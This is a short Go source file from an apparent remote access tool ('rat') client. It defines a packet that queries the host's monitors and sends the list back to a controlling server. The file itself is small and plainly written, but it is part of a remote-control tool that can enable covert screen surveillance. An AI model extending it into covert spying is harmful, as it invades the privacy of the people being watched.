package main

import (
	"rat/client/screen"
	"rat/shared"
)

type MonitorsPacket struct {
	Monitors []shared.Monitor `network:"send"`
}

func (packet MonitorsPacket) Header() shared.PacketHeader {
	return shared.MonitorsHeader
}

func (packet *MonitorsPacket) Init() {
	screen.QueryMonitors()

	packet.Monitors = screen.Monitors
}

func (packet MonitorsPacket) OnReceive() error {
	Queue <- &MonitorsPacket{}
	return nil
}
